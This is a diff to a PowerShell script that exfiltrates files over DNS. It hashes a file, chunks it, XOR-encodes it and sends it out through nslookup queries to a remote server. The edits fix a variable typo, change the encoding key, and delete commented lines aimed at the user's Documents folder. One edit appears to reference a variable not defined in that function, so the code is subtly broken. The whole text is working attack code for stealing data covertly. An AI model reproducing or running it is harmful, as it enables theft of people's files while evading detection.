@@ -14,12 +14,12 @@ function DNS-send
     $hash = [System.BitConverter]::ToString($md5.ComputeHash($bytes))
     $hash = $hash -replace '-','';
     $filename = Split-Path $file -leaf
-    $lenght = $string.Length; # here
+    $length = $string.Length; # here
     $split = 50
     $id = 0
     # get the size of the file and split it into chunks
-    $repeat=[Math]::Ceiling($lenght/$split);
-    $remainder=$lenght%$split;
+    $repeat=[Math]::Ceiling($length/$split);
+    $remainder=$length%$split;
     $jobid = [System.Guid]::NewGuid().toString().Substring(0, 7)
     $data = $jobid + '|!|' + $filename + '|!|REGISTER|!|' + $hash 
     $q = Send-DNSRequest $server $data $jobid
@@ -29,7 +29,7 @@ function DNS-send
         $q = Send-DNSRequest $server $data $jobid
     };
     if($remainder){
-        $str = $string.Substring($lenght-$remainder); #here
+        $str = $string.Substring($length-$remainder); #here
         $i = $i +1
         $data = $jobid + '|!|' + $i + '|!|' + $str
         $q = Send-DNSRequest $server $data $jobid
@@ -77,7 +77,7 @@ function Send-DNSRequest {
         $q = nslookup.exe $opti $str $server ;
     };
     if($remainder){
-        $str = $data.Substring($len-$remainder); 
+        $str = $data.Substring($length-$remainder); 
         $str = $jobid + $str + '.' + $key;
         $q = nslookup.exe $opti  $str $server;
     };
@@ -87,7 +87,7 @@ function Xor {
     param ([string] $data) 
     $enc = [system.Text.Encoding]::UTF8
     $bytes = $enc.GetBytes($data)
-    $key = "1337"
+    $key = "3X3SS"
     for($i=0; $i -lt $bytes.count ; $i++)
     {
         $bytes[$i] = $bytes[$i] -bxor $key[$i%$key.Length]
@@ -102,6 +102,3 @@ function Convert-ToCHexString
     [System.Text.Encoding]::ASCII.GetBytes($str) | % { $ans += "{0:X2}" -f $_ }
     return $ans;
 }
-#$mydoc = [environment]::getfolderpath(“mydocuments”)
-#$temp = $env:TEMP
-#Send_DNSRequest $mydoc'/data.txt'
